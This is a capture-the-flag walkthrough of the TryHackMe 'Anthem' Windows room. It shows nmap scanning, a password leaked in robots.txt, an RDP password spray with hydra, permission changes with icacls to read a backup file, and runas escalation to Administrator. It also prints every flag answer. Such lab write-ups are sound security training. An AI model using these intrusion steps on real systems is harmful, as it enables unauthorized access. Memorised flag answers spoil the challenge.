| Category          | Details                                     |
|-------------------|---------------------------------------------|
| 📝 **Name**       | [Anthem](https://tryhackme.com/room/anthem) |  
| 🏷 **Type**       | THM Challenge                               |
| 🖥 **OS**         | Windows                                     |
| 🎯 **Difficulty** | Easy                                        |
| 📁 **Tags**       | Web enumeration, RDP password spray         |

## Task 1: Website Analysis

### What port is for the web server?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ nmap -sS -sC -sV -p- $TARGET -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 20:10 +0100
Nmap scan report for 10.80.188.91
Host is up (0.041s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-LU09299160F
| Not valid before: 2026-01-09T19:06:06
|_Not valid after:  2026-07-11T19:06:06
| rdp-ntlm-info: 
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-10T19:12:35+00:00
|_ssl-date: 2026-01-10T19:13:30+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.55 seconds
```
We can see that web server is running at port 80

### What port is for remote desktop service?
`nmap` scan shows RDP running at port 3389

### What is a possible password in one of the pages web crawlers check for?

#### Check `robots.txt` content 
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ curl http://$TARGET/robots.txt
UmbracoIsTheBest!

# Use for all search robots
User-agent: *

# Define the directories not to crawl
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
```
`UmbracoIsTheBest!` seems to be a password.

### What CMS is the website using?
We can see in `robots.txt` that `/umbraco/` is disallowed, this could mean that `Umbraco` CMS is running on target.

### What is the domain of the website?
In blog title we can see `Anthem.com`

### What's the name of the Administrator
At `http://$TARGET/archive/a-cheers-to-our-it-department/` there is 'poem about admin':
> Born on a Monday,  
> Christened on Tuesday,  
> Married on Wednesday,  
> Took ill on Thursday,  
> Grew worse on Friday,  
> Died on Saturday,  
> Buried on Sunday.  
> That was the end…

It’s a traditional English nursery rhyme where each line marks a day of `Solomon Grundy`. So this implies that name is `Solomon Grundy`.

### Can we find the email address of the administrator?
In job offer at `http://$TARGET/archive/we-are-hiring/` there is an `Jane Doe` e-mail address:  
> If you have an interest in being a part of the movement send me your CV at JD@anthem.com

Thus, we could assume that e-mail address format is 1st letter of first name and 1st letter of last name. So `Solomon Grundy` would have `SG@anthem.com`.

## Task 2: Spot the flags

### What is flag 1?

#### Lookup flag in `/archive/we-are-hiring/`
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ curl -s http://$TARGET/archive/we-are-hiring/ | grep -oP 'THM{.+}' | head -n 1
THM{L0L_WH0_US3S_M3T4}
```

### What is flag 2?

#### Lookup flag in main page
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ curl -s http://$TARGET/ | grep -oP 'THM{.+}'            
THM{G!T_G00D}
```

### What is flag 3?

#### Lookup flag in `/authors/jane-doe/`
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ curl -s http://$TARGET/authors/jane-doe/ | grep -oP 'THM{.+}' | tail -n 1
THM{L0L_WH0_D15}">THM{L0L_WH0_D15}
```

### What is flag 4?

#### Lookup flag in `/archive/a-cheers-to-our-it-department/`
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ curl -s http://$TARGET/archive/a-cheers-to-our-it-department/ | grep -oP 'THM{.+}' | head -n 1
THM{AN0TH3R_M3TA}
```

## Task 3: Final stage

### Gain initial access to the machine, what is the contents of user.txt?

#### Prepare list of known employees 
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ cat <<'EOF' > employees.txt
Jane Doe
Solomon Grundy
James Orchard Halliwell
EOF
```

#### Prepare list of potential usernames based on list of potential employees
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ ~/Tools/username-anarchy/username-anarchy --input-file employees.txt > users.txt
```

#### Add `WIN-LU09299160F` domain to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ echo "$TARGET WIN-LU09299160F" | sudo tee -a /etc/hosts
10.82.149.181 WIN-LU09299160F
```

#### Spray `UmbracoIsTheBest!` password on created users' list using RDP
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ hydra -I -L users.txt -p 'UmbracoIsTheBest!' rdp://WIN-LU09299160F
<SNIP>
[3389][rdp] host: WIN-LU09299160F   login: sg   password: UmbracoIsTheBest!
<SNIP>
```
`sg` seems to be a valid username.

#### Gain access to target over RDP using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Anthem]
└─$ xfreerdp3 /v:$TARGET /d:WIN-LU09299160F /u:sg /p:'UmbracoIsTheBest!' 
```

#### Capture user flag
```
C:\Users\SG>type Desktop\user.txt
THM{N00T_NO0T}
```

### Can we spot the admin password?

#### Discover hidden `backup` directory in `C:\`
```
C:\>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 1225-5238

 Directory of C:\

15/09/2018  07:19    <DIR>          $Recycle.Bin
05/04/2020  22:42    <DIR>          backup
05/04/2020  09:56    <JUNCTION>     Documents and Settings [C:\Users]
05/04/2020  10:27    <DIR>          inetpub
11/01/2026  14:44     1,207,959,552 pagefile.sys
03/01/2021  17:45    <DIR>          PerfLogs
12/04/2020  15:36    <DIR>          Program Files
05/04/2020  22:38    <DIR>          Program Files (x86)
05/04/2020  13:46    <DIR>          ProgramData
05/04/2020  09:56    <DIR>          Recovery
05/04/2020  09:55    <DIR>          System Volume Information
05/04/2020  22:40    <DIR>          Users
03/01/2021  17:45    <DIR>          Windows
               1 File(s)  1,207,959,552 bytes
              12 Dir(s)  42,939,154,432 bytes free

C:\>cd backup

C:\backup>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 1225-5238

 Directory of C:\backup

05/04/2020  22:42    <DIR>          .
05/04/2020  22:42    <DIR>          ..
05/04/2020  22:42                21 restore.txt
               1 File(s)             21 bytes
               2 Dir(s)  42,939,154,432 bytes free

C:\backup>type restore.txt
Access is denied.
```
It seems that we do not have read permissions.

### Grant read permissions to `restore.txt`
```
C:\backup>icacls restore.txt /grant SG:R
processed file: restore.txt
Successfully processed 1 files; Failed processing 0 files

C:\backup>type restore.txt
ChangeMeBaby1MoreTime
```

#### Use `ChangeMeBaby1MoreTime` to start `cmd.exe` as `Administartor`
```
C:\backup>runas /user:Administrator "cmd.exe"
Enter the password for Administrator:
Attempting to start cmd.exe as user "WIN-LU09299160F\Administrator" ...
```

New `cmd.exe` window has been opened `whoami` confirms that `ChangeMeBaby1MoreTime` is admin password.
```
C:\Windows\system32>whoami
win-lu09299160f\administrator 
```

### Escalate your privileges to root, what is the contents of root.txt?

#### Capture root flag
```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{Y0U_4R3_1337}
```